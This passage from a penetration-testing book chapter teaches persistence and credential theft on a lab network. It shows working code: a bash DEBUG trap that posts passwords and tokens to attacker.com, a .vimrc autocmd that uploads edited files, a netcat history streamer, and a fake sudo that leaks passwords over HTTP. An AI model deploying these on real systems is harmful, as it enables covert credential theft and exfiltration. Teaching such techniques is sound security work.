                                     -ie "bearer" \&#13;
                                   <span class="Code_CodeAnnotation" aria-label="annotation5">❺</span> -ie "authorization"; then&#13;
      curl https://attacker.com \&#13;
              -H "Content-Type:application/json" \&#13;
              -d "{\"command\":\"${BASH_COMMAND}\"}" \&#13;
              --max-time 3 \&#13;
              --connect-timeout 3 \&#13;
              -s &amp;&gt; /dev/null&#13;
    fi&#13;
   ;;&#13;
  esac&#13;
}&#13;
&#13;
<span class="codeannotated_CodeAnnotation" aria-label="annotation6">❻</span> <span class="SANS_TheSansMonoCd_W5Regular_11">trap 'hook' DEBUG</span>&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I">Listing 10-5: Hooking commands and stealing credentials</span></p>&#13;
<p class="TX">We create a function named <span class="SANS_TheSansMonoCd_W5Regular_11">hook()</span> that uses a <span class="SANS_TheSansMonoCd_W5Regular_11">case</span> statement <span class="CodeAnnotation" aria-label="annotation1">❶</span>. The statement will try to match the <span class="SANS_TheSansMonoCd_W5Regular_11">BASH_COMMAND</span> variable against two patterns: <span class="SANS_TheSansMonoCd_W5Regular_11">mysql*</span> <span class="CodeAnnotation" aria-label="annotation2">❷</span> and <span class="SANS_TheSansMonoCd_W5Regular_11">curl*</span> <span class="CodeAnnotation" aria-label="annotation4">❹</span>. These patterns will match anything that starts with either of these strings. This should identify uses of the <span class="SANS_TheSansMonoCd_W5Regular_11">mysql</span> command to connect to a database and the <span class="SANS_TheSansMonoCd_W5Regular_11">curl</span> command to make HTTP requests.</p>&#13;
<p class="TX">Next, if the command involved calling the <span class="SANS_TheSansMonoCd_W5Regular_11">mysql</span> client, we check whether the command included a password on the command line by using the <span class="SANS_TheSansMonoCd_W5Regular_11">-p</span> or <span class="SANS_TheSansMonoCd_W5Regular_11">--password</span> arguments <span class="CodeAnnotation" aria-label="annotation3">❸</span>. In this case, the password would belong to the database. If we have a match, we send an HTTP POST request to <i>https://attacker.com</i> containing a JSON payload with the raw command in the request’s POST body.</p>&#13;
<p class="TX">At <span class="CodeAnnotation" aria-label="annotation5">❺</span>, we do a similar thing with <span class="SANS_TheSansMonoCd_W5Regular_11">curl</span>. We search for strings such as <span class="SANS_TheSansMonoCd_W5Regular_11">token</span>, <span class="SANS_TheSansMonoCd_W5Regular_11">apikey</span>, <span class="SANS_TheSansMonoCd_W5Regular_11">api_token</span>, <span class="SANS_TheSansMonoCd_W5Regular_11">bearer</span>, or <span class="SANS_TheSansMonoCd_W5Regular_11">authorization</span> to catch any API keys being passed on the command line. These credentials might belong to an internal web panel or to an administration interface of some sort. The search is case <span role="doc-pagebreak" epub:type="pagebreak" id="pg_245" aria-label="245"/>insensitive (<span class="SANS_TheSansMonoCd_W5Regular_11">-i</span>). If we find such a pattern, we send a request containing the command and the credentials to the attacker’s website over HTTP POST.</p>&#13;
<p class="TX">Finally, we use <span class="SANS_TheSansMonoCd_W5Regular_11">trap</span> to trap the <span class="SANS_TheSansMonoCd_W5Regular_11">hook()</span> function with the <span class="SANS_TheSansMonoCd_W5Regular_11">DEBUG</span> sigspec type <span class="CodeAnnotation" aria-label="annotation6">❻</span>.</p>&#13;
<blockquote>&#13;
<p class="Note"><span class="SANS_Dogma_OT_Bold_B_15">NOTE</span></p>&#13;
</blockquote>&#13;
<p class="NOTE-TXT"><i>You can download this chapter’s scripts from</i> <span class="note_LinkURL_I"><a href="https://github.com/dolevf/Black-Hat-Bash/blob/master/ch10">https://github.com/dolevf/Black-Hat-Bash/blob/master/ch10</a></span>.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec9">&#13;
<h2 class="H1" id="sec9"><span id="h1-90"/><span class="SANS_Futura_Std_Bold_B_11">Credential Theft</span></h2>&#13;
<p class="TNI1">If you can maintain access to a user’s credential data, or perhaps even to the keyboard actions taken by users, you could keep your access to the system as a whole. For example, if a user reset their password and we happened to intercept the commands used to do so, we could maintain access even if the credentials were rotated (at least until someone discovered and disarmed our mechanism or completely wiped the infected system).</p>&#13;
<p class="TX">We can capture credential information in a variety of ways. One way is by trojanizing commands, such as by replacing them with malicious binaries or otherwise tampering with their execution flow by injecting malicious logic into them. In this section, we’ll implement malicious logic in a few common system administrator utilities. We’ll also extract credentials from the bash history file and send these over the network.</p>&#13;
<section epub:type="division" aria-labelledby="sec10">&#13;
<h3 class="H2" id="sec10"><span id="h2-151"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Hooking a Text Editor</span></h3>&#13;
<p class="TNI1"><i>Vim</i> is a common text editor application often found on servers. It’s also many developers’ and system administrators’ go-to text-editing application, so it warrants its own section.</p>&#13;
<blockquote>&#13;
<p class="Note"><span class="SANS_Dogma_OT_Bold_B_15">NOTE</span></p>&#13;
</blockquote>&#13;
<p class="NOTE-TXT"><i>If you’ve never used Vim before, we highly recommend you familiarize yourself with it. It’s a powerful editor with many additional capabilities, such as macros, scripts, and a plug-in system.</i></p>&#13;
<p class="TX">If you have access to one or more users on the system and can modify configurations in their home directories, you can exploit Vim’s <i>autocmd</i> feature, an automation system able to run certain shell commands when special editor events occur. We define autocmd actions by using the <i>~/.vimrc</i> file, which Vim usually searches for in the user’s home directory. When the text editor is opened, it reads from this file and looks for any special configurations and instructions.</p>&#13;
<p class="TX">autocmd events could occur whenever a file is written or read, whenever a file is open or closed, and whenever the editor itself is opened or closed, among other cases. <a href="chapter10.xhtml#tab10-1">Table 10-1</a> highlights a few key autocmd events of interest.</p>&#13;
<p class="TT" id="tab10-1"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_246" aria-label="246"/><span class="Heavy"><span class="SANS_Futura_Std_Heavy_B_11">Table 10-1:</span></span> <span class="SANS_Futura_Std_Book_11">Interesting autocmd Events</span></p>&#13;
<table class="Basic-Table">&#13;
<thead>&#13;
<tr>&#13;
<th class="TCH" scope="col"><p class="TCH1"><span class="SANS_Futura_Std_Heavy_B_11">Event name</span></p></th>&#13;
<th class="TCH" scope="col"><p class="TCH1"><span class="SANS_Futura_Std_Heavy_B_11">Description</span></p></th>&#13;
</tr>&#13;
</thead>&#13;
<tbody>&#13;
<tr>&#13;
<td class="TBF"><p class="TB1"><span class="SANS_TheSansMonoCd_W5Regular_11">ShellCmdPost</span></p></td>&#13;
<td class="TBF"><p class="TB1"><span class="SANS_Futura_Std_Book_11">After executing a shell command</span></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td class="TB"><p class="TB1"><span class="SANS_TheSansMonoCd_W5Regular_11">BufWritePost</span></p></td>&#13;
<td class="TB"><p class="TB1"><span class="SANS_Futura_Std_Book_11">After writing the entire buffer</span></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td class="TB"><p class="TB1"><span class="SANS_TheSansMonoCd_W5Regular_11">BufWipeout</span></p></td>&#13;
<td class="TB"><p class="TB1"><span class="SANS_Futura_Std_Book_11">Before deleting the buffer</span></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td class="TBL"><p class="TB1"><span class="SANS_TheSansMonoCd_W5Regular_11">StdinReadPost</span></p></td>&#13;
<td class="TBL"><p class="TB1"><span class="SANS_Futura_Std_Book_11">After reading from stdin into the buffer</span></p></td>&#13;
</tr>&#13;
</tbody>&#13;
</table>&#13;
<p class="TX">The <span class="SANS_TheSansMonoCd_W5Regular_11">BufWritePost</span> event allows us to take an action after the editor writes whatever was present in the buffer. This means that if a user opened a file and performed a write action, autocmd would execute our commands.</p>&#13;
<p class="TX">Let’s exploit this behavior. First, write the following content into the <i>~/.vimrc</i> file under a user’s home directory. You can use any of the lab’s compromised machines, such as <i>p-jumpbox-01</i> (172.16.10.13), using the backup or <i>root</i> user:</p>&#13;
<pre><code>autocmd BufWritePost *.conf,*.config :silent !timeout 3 curl -m 5 -s&#13;
http://172.16.10.1:8080 -o /dev/null --data-binary @&lt;afile&gt; &amp;&#13;
</code></pre>&#13;
<p class="TX">Let’s dissect what’s happening. First, we define an autocmd instruction by using the <span class="SANS_TheSansMonoCd_W5Regular_11">autocmd</span> keyword. Next, we specify the event name <span class="SANS_TheSansMonoCd_W5Regular_11">BufWritePost</span>, followed by two file extensions, <i>*.conf</i> and <i>*.config</i>. This will ensure that the command triggers whenever a file with the either of these extensions is written.</p>&#13;
<p class="TX">We use <span class="SANS_TheSansMonoCd_W5Regular_11">:silent</span> to suppress any command messages or errors. Finally, we define a command with <span class="SANS_TheSansMonoCd_W5Regular_11">!</span>, followed by the syntax of the shell command of interest. In this example, we’re making an HTTP POST request to 172.16.10.1:8080 by using <span class="SANS_TheSansMonoCd_W5Regular_11">curl</span>, which will run a listener in our Kali machine. We pass <span class="SANS_TheSansMonoCd_W5Regular_11">-m</span> (max time) with a value of <span class="SANS_TheSansMonoCd_W5Regular_11">5</span> to ensure that the entire operation doesn’t take more than five seconds. We then pass the <span class="SANS_TheSansMonoCd_W5Regular_11">-s</span> (silent) argument to stop text from being printed out, and redirect the standard output to <i>/dev/null</i> by using <span class="SANS_TheSansMonoCd_W5Regular_11">-o /dev/null</span>. We also pass <span class="SANS_TheSansMonoCd_W5Regular_11">--data-binary @&lt;afile&gt;</span> to upload a file. The autocmd <span class="SANS_TheSansMonoCd_W5Regular_11">&lt;afile&gt;</span> variable represents the actual file that Vim is editing.</p>&#13;
<p class="TX">To summarize, when a user writes a file with a name such as <i>credentials.conf</i>, Vim will execute a <span class="SANS_TheSansMonoCd_W5Regular_11">curl</span> command to secretly send the file to the remote listener. Save this file as <i>~/.vimrc</i>. Next, open a remote listener on the Kali machine by using any TCP listener of choice:</p>&#13;
<pre><code>$ <b>nc -lkvp 8080</b>&#13;
&#13;
listening on [any] 8080 ...&#13;
</code></pre>&#13;
<p class="TX">Finally, using either <span class="SANS_TheSansMonoCd_W5Regular_11">vi</span> or <span class="SANS_TheSansMonoCd_W5Regular_11">vim.tiny</span> commands (as <span class="SANS_TheSansMonoCd_W5Regular_11">vi</span> is a symbolic link to <span class="SANS_TheSansMonoCd_W5Regular_11">vim.tiny</span> in the lab), open a file and write content to it:</p>&#13;
<pre><code>$ <b>vim.tiny /tmp/credentials.conf</b>&#13;
&#13;
USER=nostarch&#13;
PASS=press123&#13;
</code></pre>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_247" aria-label="247"/>When you use Vim to save the file to disk, you should notice that the content of the file was sent to the listener:</p>&#13;
<pre><code>listening on [any] 8080 ...&#13;
172.16.10.13: inverse host lookup failed: Unknown host&#13;
connect to [172.16.10.1] from (UNKNOWN) [172.16.10.13] 42538&#13;
POST / HTTP/1.1&#13;
Host: 172.16.10.1:8080&#13;
User-Agent: curl/7.88.1&#13;
Accept: */*&#13;
Content-Length: 29&#13;
Content-Type: application/x-www-form-urlencoded&#13;
&#13;
<b>USER=nostarch</b>&#13;
<b>PASS=press123</b>&#13;
</code></pre>&#13;
<p class="TX">If you wanted to leak all files, no matter their extension, this autocmd command should do the job:</p>&#13;
<pre><code>autocmd BufWritePost * :silent !timeout 1 curl -m 5 -s -o /dev/null&#13;
http://172.16.10.1:8080 --data-binary @&lt;afile&gt;&#13;
</code></pre>&#13;
<p class="TX">However, if a file is particularly large, the upload could take a long time. This could reveal to the user that something nefarious is happening, as writing to the file would cause a noticeable delay. Let’s make our hook a little cleverer (<a href="chapter10.xhtml#Lis10-6">Listing 10-6</a>).</p>&#13;
<span id="Lis10-6"/><pre><code>autocmd BufWritePost *.conf,*.config :silent !if grep "PASSWORD\|SECRET\|APIKEY" &lt;afile&gt;;&#13;
then timeout 3 curl -m 5 -s -o /dev/null http://172.16.10.1:8080&#13;
--data-binary @&lt;afile&gt;; fi&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I">Listing 10-6: Conditional command execution with autocmd</span></p>&#13;
<p class="TX">Now the command will look only for files containing credentials such as passwords or API keys.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec11">&#13;
<h3 class="H2" id="sec11"><span id="h2-152"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Streaming Executed Commands</span></h3>&#13;
<p class="TNI1">In <span class="Xref"><a href="chapter8.xhtml">Chapter 8</a></span>, we discussed history files, such as <i>~/.bash_history</i>. History files keep a record of commands executed by users and allow for an access, audit, and replay of previously executed commands.</p>&#13;
<p class="TX">History files update whenever new commands are executed, so it could be interesting to stream the history files over the network to a listener providing a live record of command-execution events to a server we control. These commands could reveal what users are executing on a server and capture any credentials they enter via the command line. (Note that <i>~/.bash_history</i> is just an example; you may find it useful to stream other files in your future engagements by using the method shown here.)</p>&#13;
<p class="TX">Let’s set up a few bash commands to send the last written command over the network to a remote listener. This technique assumes you have access to a user’s home directory and can modify the <i>~/.profile</i> file or have the ability to write into the system-wide <i>/etc/profile</i> file.</p>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_248" aria-label="248"/>On <i>p-jumpbox-01</i> (172.16.10.13), using the <i>root</i> user, create a file under the <i>/etc/profile.d</i> directory named <i>99-stream.sh</i> with the contents in <a href="chapter10.xhtml#Lis10-7">Listing 10-7</a>.</p>&#13;
<span id="Lis10-7"/><pre><code><span class="codeannotated_CodeAnnotation" aria-label="annotation1">❶</span> export PROMPT_COMMAND="history -a; history -r; $PROMPT_COMMAND"&#13;
&#13;
<span class="codeannotated_CodeAnnotation" aria-label="annotation2">❷</span> if ! pgrep -u "$(whoami)" nc &amp;&gt; /dev/null; then&#13;
<span class="Code_CodeAnnotation" aria-label="annotation3">❸</span> tail -F ~/.bash_history | nc 172.16.10.1 4444 &amp;&gt; /dev/null &amp;&#13;
fi&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I">Listing 10-7: Streaming history files over the network</span></p>&#13;
<p class="TX">At <span class="CodeAnnotation" aria-label="annotation1">❶</span>, we export the <span class="SANS_TheSansMonoCd_W5Regular_11">PROMPT_COMMAND</span> variable to make it available to subsequent commands during execution. We’ll set this variable to a bash command that will execute just before the shell displays the prompt in the terminal. You’ll notice that we pass the <span class="SANS_TheSansMonoCd_W5Regular_11">history</span> command twice as its value: once with the <span class="SANS_TheSansMonoCd_W5Regular_11">-a</span> (append) parameter and a second time with the <span class="SANS_TheSansMonoCd_W5Regular_11">-r</span> (read) parameter. The <span class="SANS_TheSansMonoCd_W5Regular_11">PROMPT_COMMAND</span> value will execute just before the prompt is shown, allowing us to append to and read from the history file whenever a command is executed.</p>&#13;
<p class="TX">We check whether the Netcat (<span class="SANS_TheSansMonoCd_W5Regular_11">nc</span>) process is running by using <span class="SANS_TheSansMonoCd_W5Regular_11">pgrep</span> <span class="CodeAnnotation" aria-label="annotation2">❷</span>. We use <span class="SANS_TheSansMonoCd_W5Regular_11">-u</span> (user) with <span class="SANS_TheSansMonoCd_W5Regular_11">whoami</span> to narrow the process list to only those run by the current user, followed by the process name of <span class="SANS_TheSansMonoCd_W5Regular_11">nc</span>. If <span class="SANS_TheSansMonoCd_W5Regular_11">pgrep</span> returns an exit code of <span class="SANS_TheSansMonoCd_W5Regular_11">1</span> (process not found), no reverse shell has connected from this user, so we can establish one. This helps us avoid opening multiple connections from the same user.</p>&#13;
<p class="TX">We use the <span class="SANS_TheSansMonoCd_W5Regular_11">tail</span> command to read the end of the history file and pipe it to <span class="SANS_TheSansMonoCd_W5Regular_11">nc</span> <span class="CodeAnnotation" aria-label="annotation3">❸</span>. The <span class="SANS_TheSansMonoCd_W5Regular_11">-F</span> (follow) argument tracks the end of the file so any new content gets sent across the wire.</p>&#13;
<p class="TX">Finally, we’ll use <span class="SANS_TheSansMonoCd_W5Regular_11">socat</span> on Kali so we can receive multiple connections without closing the server’s end of the connection if multiple users connect and execute commands simultaneously:</p>&#13;
<pre><code>$ <b>socat TCP4-LISTEN:4444,fork STDOUT</b></code></pre>&#13;
<p class="TX">Open another terminal and log in to <i>p-jumpbox-01</i> (172.16.10.13) as the user <i>backup</i> (with the previously compromised password <i>backup</i>). Then enter a few commands:</p>&#13;
<pre><code>$ <b>ssh backup@172.16.10.13</b>&#13;
backup@172.16.10.13's password:&#13;
&#13;
backup@p-jumpbox-01:~$ <b>id</b>&#13;
uid=34(backup) gid=34(backup) groups=34(backup)&#13;
&#13;
backup@p-jumpbox-01:~$ <b>whoami</b>&#13;
backup&#13;
&#13;
backup@p-jumpbox-01:~$ <b>uptime</b>&#13;
02:21:50 up 14 days, 12:32,  0 user,  load average: 0.60, 0.40, 0.23&#13;
</code></pre>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_249" aria-label="249"/>Observe the output from <span class="SANS_TheSansMonoCd_W5Regular_11">socat</span>:</p>&#13;
<pre><code>$ <b>socat TCP4-LISTEN:4444,fork STDOUT</b>&#13;
&#13;
id&#13;
whoami&#13;
uptime&#13;
</code></pre>&#13;
<p class="TX">You could adapt this technique to stream any file of value during a penetration test, such as application or system logfiles.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec12">&#13;
<h3 class="H2" id="sec12"><span id="h2-153"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Forging a Not-So-Innocent sudo</span></h3>&#13;
<p class="TNI1">In <span class="Xref"><a href="chapter9.xhtml">Chapter 9</a></span>, we used misconfigurations of the <span class="SANS_TheSansMonoCd_W5Regular_11">sudo</span> command to elevate our privileges. But we can compromise <span class="SANS_TheSansMonoCd_W5Regular_11">sudo</span> in another way: by replacing it with our own malicious version, then harvesting the user’s password when they enter it to run the command.</p>&#13;
<p class="TX">The main downside to this approach is that when a user provides a correct password to <span class="SANS_TheSansMonoCd_W5Regular_11">sudo</span>, it caches the credentials for a period (such as 15 minutes), and subsequent commands won’t require reentering the password. The setting responsible for the caching duration is called <span class="SANS_TheSansMonoCd_W5Regular_11">timestamp_timeout</span>.</p>&#13;
<p class="TX">Despite the caching, if we’re able to intercept the execution when the user enters their password the first time, we may be able to leak their password. Let’s walk through such an example. In this scenario, we assume we have access to alter a user’s environment and can modify files such as <i>~/.bashrc</i>.</p>&#13;
<p class="TX">We’ll create a fake <span class="SANS_TheSansMonoCd_W5Regular_11">sudo</span> script. Then we’ll modify a compromised user’s environment so that calling <span class="SANS_TheSansMonoCd_W5Regular_11">sudo</span> will execute the fake version through the use of an alias, send their password over the network by using <span class="SANS_TheSansMonoCd_W5Regular_11">curl</span>, and continue the normal <span class="SANS_TheSansMonoCd_W5Regular_11">sudo</span> execution flow, to avoid raising suspicion.</p>&#13;
<p class="TX">Let’s begin! You can perform this scenario on <i>p-jumpbox-01</i> (172.16.10.13) by implanting the fake <span class="SANS_TheSansMonoCd_W5Regular_11">sudo</span> script in the backup user account. Create this fake <span class="SANS_TheSansMonoCd_W5Regular_11">sudo</span> file somewhere writable:</p>&#13;
<pre><code>$ <b>touch /tmp/sudo &amp;&amp; chmod +x /tmp/sudo</b></code></pre>&#13;
<p class="TX">Next, create an alias by adding a line to the compromised user’s <i>~/.bashrc</i> environment file:</p>&#13;
<pre><code>alias sudo='/tmp/sudo'</code></pre>&#13;
<p class="TX">Finally, populate the script with the code in <a href="chapter10.xhtml#Lis10-8">Listing 10-8</a>.</p>&#13;
<span id="Lis10-8"/><pre><code>#!/bin/bash&#13;
ARGS="$@"&#13;
&#13;
leak_over_http() {&#13;
  local encoded_password&#13;
<span class="Code_CodeAnnotation" aria-label="annotation1">❶</span> encoded_password=$(echo "${1}" | base64 | sed s'/[=+/]//'g)&#13;
  curl -m 5 -s -o /dev/null "http://172.16.10.1:8080/${encoded_password}"&#13;
}&#13;
&#13;
<span role="doc-pagebreak" epub:type="pagebreak" id="pg_250" aria-label="250"/><span class="codeannotated_CodeAnnotation" aria-label="annotation2">❷</span> stty -echo&#13;
<span class="codeannotated_CodeAnnotation" aria-label="annotation3">❸</span> read -r -p "[sudo] password for $(whoami): " sudopassw&#13;
&#13;
leak_over_http "${sudopassw}"&#13;
<span class="codeannotated_CodeAnnotation" aria-label="annotation4">❹</span> stty echo&#13;
echo "${sudopassw}" | /usr/bin/sudo -p "" -S -k ${ARGS}&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I">Listing 10-8: A fake sudo script</span></p>&#13;
<p class="TX">At <span class="CodeAnnotation" aria-label="annotation2">❷</span>, we turn off input echoing by using <span class="SANS_TheSansMonoCd_W5Regular_11">stty -echo</span>. We then read input from the user and present a <span class="SANS_TheSansMonoCd_W5Regular_11">sudo</span>-like prompt <span class="CodeAnnotation" aria-label="annotation3">❸</span>. As the input is the user’s password, it shouldn’t be presented in cleartext to the user while they’re typing it. This is because, by default, <span class="SANS_TheSansMonoCd_W5Regular_11">sudo</span> hides the input while it’s being typed, and we need to emulate the look and feel of the original command. So, we disable input echoing before accepting input from the user.</p>&#13;
<p class="TX">Next, we leak the provided password by using the <span class="SANS_TheSansMonoCd_W5Regular_11">leak_over_http()</span> function. This function will use base64 to encode the password and use <span class="SANS_TheSansMonoCd_W5Regular_11">curl</span> to make an HTTP GET request to a path on the web server, using the captured password as the path <span class="CodeAnnotation" aria-label="annotation1">❶</span>.</p>&#13;
<p class="TX">At <span class="CodeAnnotation" aria-label="annotation4">❹</span>, we turn on input echoing and pass the password, along with the command the user executed, to the real <span class="SANS_TheSansMonoCd_W5Regular_11">sudo</span> binary (<i>/usr/bin/sudo</i>) so that the <span class="SANS_TheSansMonoCd_W5Regular_11">sudo</span> execution resumes normally. <a href="chapter10.xhtml#fig10-1">Figure 10-1</a> highlights this flow from end to end.</p>&#13;
<figure class="IMG"><img id="fig10-1" class="img1" src="../images/pg250.jpg" alt=""/>&#13;
<figcaption><p class="CAP"><span class="SANS_Futura_Std_Book_Oblique_I_11">Figure 10-1: A password interception flow using a fake sudo script</span></p></figcaption>&#13;
</figure>&#13;
<p class="TX">Finally, on your Kali machine, use Python to run a simple HTTP server:</p>&#13;
<pre><code>$ <b>python -m http.server 8080</b>&#13;
&#13;
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/)...&#13;
</code></pre>&#13;
<p class="TX">Then open another terminal to <i>p-jumpbox-01</i> (172.16.10.13) and run a <span class="SANS_TheSansMonoCd_W5Regular_11">sudo</span> command:</p>&#13;
<pre><code>$ <b>sudo vi --help</b>&#13;
&#13;
[sudo] password for backup:&#13;
</code></pre>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_251" aria-label="251"/>You should receive the leaked password:</p>&#13;
<pre><code>172.16.10.13 - - [22:59:32] "GET <b>/YmFja3VwCg</b> HTTP/1.1" 404 -</code></pre>&#13;
<p class="TX">The bolded base64-encoded string is <i>backup</i>, which is the password of the backup user.</p>&#13;
<p class="TX">You can find this script at <i><a href="https://github.com/dolevf/Black-Hat-Bash/blob/master/ch10/fake_sudo.sh">https://github.com/dolevf/Black-Hat-Bash/blob/master/ch10/fake_sudo.sh</a></i>.</p>&#13;
<p class="HeadAExercise"><span id="exe-21"/><span class="SANS_Futura_Std_Heavy_B_15">Exercise 21: Hijacking Password Utilities</span></p>&#13;
<p class="TNI1">You could use an approach similar to the <span class="SANS_TheSansMonoCd_W5Regular_11">sudo</span> attack we just performed to hijack other utilities. Any tool that interacts with credentials can help you gain persistence, including the following:</p>&#13;
<p class="RunInPara1"><span class="SANS_TheSansMonoCd_W7Bold_B_11">passwd </span>For changing local user passwords</p>&#13;
<p class="RunInPara"><span class="SANS_TheSansMonoCd_W7Bold_B_11">chpasswd</span> For updating passwords in bulk</p>&#13;
<p class="RunInPara"><span class="SANS_TheSansMonoCd_W7Bold_B_11">htpasswd</span> For setting up or changing Apache basic authentication</p>&#13;
<p class="RunInPara"><span class="SANS_TheSansMonoCd_W7Bold_B_11">smbpasswd</span> For changing Samba user passwords (such as Active Directory user passwords)</p>&#13;
<p class="RunInPara2"><span class="SANS_TheSansMonoCd_W7Bold_B_11">ldappasswd</span> For changing Lightweight Directory Access Protocol user passwords</p>&#13;
<p class="TX">Try programming a fake command that accepts passwords as input. Here is guidance on how to go about this:</p>&#13;
<p class="NLF">  1.  Use <span class="SANS_TheSansMonoCd_W5Regular_11">man</span> to learn about the target utility.</p>&#13;
<p class="NL">  2.  Attempt to use the tool, taking notes on how it prompts users for passwords, what type of output it produces, and how it handles errors.</p>&#13;
<p class="NL">  3.  Create a fake utility that can produce the same outputs and accept the same inputs.</p>&#13;
<p class="NLL">  4.  Retrofit the <span class="SANS_TheSansMonoCd_W5Regular_11">sudo</span> script from the previous section to fit your new fake utility, or create a new script from scratch.</p>&#13;
</section>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec13">&#13;
<h2 class="H1" id="sec13"><span id="h1-91"/><span class="SANS_Futura_Std_Bold_B_11">Distributing Malicious Packages</span></h2>&#13;
<p class="TNI1">Linux systems use package installers such as Debian (DEB) and RPM, depending on the distribution. These installers are interesting because they let you package your own files, and you may be able to backdoor a system if you can get someone to install a malicious package you’ve developed. In the next sections, we’ll explore the DEB packaging system. Then we’ll create packages that contain malicious code.</p>&#13;
<p class="TX">Note that software installation on Linux requires root privileges by default; a regular user cannot use commands such as <span class="SANS_TheSansMonoCd_W5Regular_11">dpkg -i</span> <span class="SANS_TheSansMonoCd_W5Regular_Italic_I_11">package</span> or <span class="SANS_TheSansMonoCd_W5Regular_11">rpm -i</span> <span class="SANS_TheSansMonoCd_W5Regular_Italic_I_11">package</span> unless they were specifically granted privileged access to these utilities.</p>&#13;
<section epub:type="division" aria-labelledby="sec14">&#13;
<h3 class="H2" id="sec14"><span id="h2-154"/><span role="doc-pagebreak" epub:type="pagebreak" id="pg_252" aria-label="252"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Understanding DEB Packages</span></h3>&#13;
<p class="TNI1">You’ll find DEB packages used by the Debian Linux distribution and its derivatives, such as Ubuntu. DEB packages are <i>ar</i> (archive) files and contain three files: <i>debian-binary</i>, the control archive, and the data archive.</p>&#13;
<p class="TX">The <i>debian-binary</i> file is a text file containing the package’s version number, such as <span class="SANS_TheSansMonoCd_W5Regular_11">2.0</span>. The <i>control archive</i> is a compressed file containing scripts and metadata information. The <i>data archive</i> contains the files the package should install (for example, the software’s manual pages or additional binaries).</p>&#13;
<p class="TX">Let’s explore an example package before building our own. Download the example DEB package, <i>example_amd64.deb</i>. Then run <span class="SANS_TheSansMonoCd_W7Bold_B_11">dpkg --info</span> on the package to see information about it:</p>&#13;
<pre><code>$ <b>dpkg --info example_amd64.deb</b>&#13;
&#13;
new Debian package, version 2.0.&#13;
 size 784 bytes: control archive=420 bytes.&#13;
     168 bytes,     6 lines      control&#13;
      79 bytes,     3 lines   *  postinst             #!/bin/bash&#13;
 Package: example&#13;
 Version: 1.0.0&#13;
 Maintainer: Black Hat Bash (info@blackhatbash.com)&#13;
 Description: My awesome package&#13;
 Homepage: https://blackhatbash.com&#13;
 Architecture: all&#13;
</code></pre>&#13;
<p class="TX">Next, run <span class="SANS_TheSansMonoCd_W5Regular_11">strings</span> on the package to see its contents. You should see the three files we discussed:</p>&#13;
<pre><code>$ <b>strings example_amd64.deb</b>&#13;
&#13;
!&lt;arch&gt;&#13;
debian-binary   1694828481  0     0     100644  4&#13;
control.tar.xz  1694828481  0     0     100644  420&#13;
YZdata.tar.xz   1694828481  0     0     100644  172&#13;
<var>--snip--</var>&#13;
</code></pre>&#13;
<p class="TX">Finally, install the package to see what it does. You can do this on any machine in the lab or on Kali:</p>&#13;
<pre><code>$ <b>sudo dpkg -i example_amd64.deb</b>&#13;
&#13;
Selecting previously unselected package example.&#13;
(Reading database ... 423743 files and directories currently installed.)&#13;
Preparing to unpack example_amd64.deb ...&#13;
Unpacking example (1.0.0) ...&#13;
Setting up example (1.0.0) ...&#13;
&#13;
<b>I don't do anything other than echoing this to the screen!</b>&#13;
</code></pre>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_253" aria-label="253"/>As you can see, the package doesn’t do anything special other than printing a message to the screen. Consider this the “Hello, world!” of DEB packages.</p>&#13;
<p class="TX">To extract the contents of a <i>.deb</i> file, use the <span class="SANS_TheSansMonoCd_W5Regular_11">ar</span> command:</p>&#13;
<pre><code>$ <b>ar -v -x example_amd64.db</b>&#13;
&#13;
x - debian-binary&#13;
x - control.tar.xz&#13;
x - data.tar.xz&#13;
</code></pre>&#13;
<p class="TX">The <span class="SANS_TheSansMonoCd_W5Regular_11">v</span> flag is for verbose mode; the <span class="SANS_TheSansMonoCd_W5Regular_11">x</span> flag, for extraction, accepts the filename. To further extract the <i>control.tar.xz</i> and <i>data.tar.xz</i> files, you can use the <span class="SANS_TheSansMonoCd_W5Regular_11">tar</span> command with <span class="SANS_TheSansMonoCd_W5Regular_11">-x</span> (extract), <span class="SANS_TheSansMonoCd_W5Regular_11">-v</span> (verbose), and <span class="SANS_TheSansMonoCd_W5Regular_11">-f</span> (file):</p>&#13;
<pre><code>$ <b>tar -xvf control.tar.xz</b>&#13;
$ <b>tar -xvf data.tar.xz</b>&#13;
</code></pre>&#13;
<p class="TX">DEB packages can contain several types of scripts. The most interesting to us are <i>inst</i> (installation) and <i>rm</i> (remove) scripts. <i>Installation scripts</i> are responsible for the bootstrapping of the package. They include preinstallation scripts (<i>preinst</i>), called before the package is installed, and post-installation scripts (<i>postinst</i>), called afterward. These scripts can perform any task, but some common tasks are creating directories, setting permissions, and copying files.</p>&#13;
<p class="TX">The <i>rm scripts</i> perform some form of cleanup, such as removing files or stopping services. These include <i>prerm</i> scripts, which take actions such as the removal of symbolic links or files associated with the package before it’s finally removed, and <i>postrm</i> scripts, which clean up files after the package is removed. Can you think of ways to include malicious code in these scripts?</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec15">&#13;
